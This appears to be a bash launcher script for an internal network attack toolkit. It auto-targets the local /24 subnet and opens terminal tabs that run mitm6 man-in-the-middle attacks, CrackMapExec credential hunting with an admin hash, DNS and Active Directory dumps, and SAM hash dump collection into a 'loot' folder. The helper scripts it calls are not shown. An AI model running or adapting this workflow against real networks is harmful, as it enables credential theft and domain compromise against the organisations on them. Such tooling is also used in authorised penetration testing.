echo -e "\x1B[31m --------------------------------------- \x1B[0m"
echo -e "\x1B[31m ---MAKING FOLDERS--- \x1B[0m"
echo -e "\x1B[31m --------------------------------------- \x1B[0m"
mkdir loot
mkdir hosts
mkdir logs

echo -e "\x1B[31m --------------------------------------- \x1B[0m"
echo -e "\x1B[31m ----------FINDING LOCAL NETWORK----------- \x1B[0m"
echo -e "\x1B[31m --------------------------------------- \x1B[0m"

ip=$(hostname -I)
echo $ip |cut -d '.' -f1,2,3 |sort -u |sed 's/$/.0\/24/' > hosts/targets.txt

echo -e "\x1B[31m --------------------------------------- \x1B[0m"
echo -e "\x1B[31m -TARGETING "$(cat hosts/targets.txt)"- \x1B[0m"
echo -e "\x1B[31m --------------------------------------- \x1B[0m"

echo -e "\x1B[31m --------------------------------------- \x1B[0m"
echo -e "\x1B[31m ------OPENING TAB FOR MITM6 RUNS------- \x1B[0m"
echo -e "\x1B[31m --------------------------------------- \x1B[0m"

echo "Browse to tab and feed it Domain info"
gnome-terminal --tab -e "bash -c 'bash bin/mitm6.sh; bash'"

echo -e "\x1B[31m --------------------------------------- \x1B[0m"
echo -e "\x1B[31m ----CME LOOKING FOR CLEARTXT CREDS----- \x1B[0m"
echo -e "\x1B[31m --------------------------------------- \x1B[0m"

echo "Browse to tab and feed it Admin hash when ready"
gnome-terminal --tab -e "bash -c 'bash bin/cme.sh; bash'"

echo -e "\x1B[31m --------------------------------------- \x1B[0m"
echo -e "\x1B[31m -----OPENING TAB FOR DNS & AD DUMPS---- \x1B[0m"
echo -e "\x1B[31m --------------------------------------- \x1B[0m"

echo "Browse to tab and feed it Domain Creds when ready"
gnome-terminal --tab -e "bash -c 'bash bin/auto_recon.sh; bash'"

echo -e "\x1B[31m --------------------------------------- \x1B[0m"
echo -e "\x1B[31m ----------WATCHING FOR SAM DUMPS------- \x1B[0m"
echo -e "\x1B[31m --------------------------------------- \x1B[0m"

echo "When ready run: tail -f loot/sam_dump*"
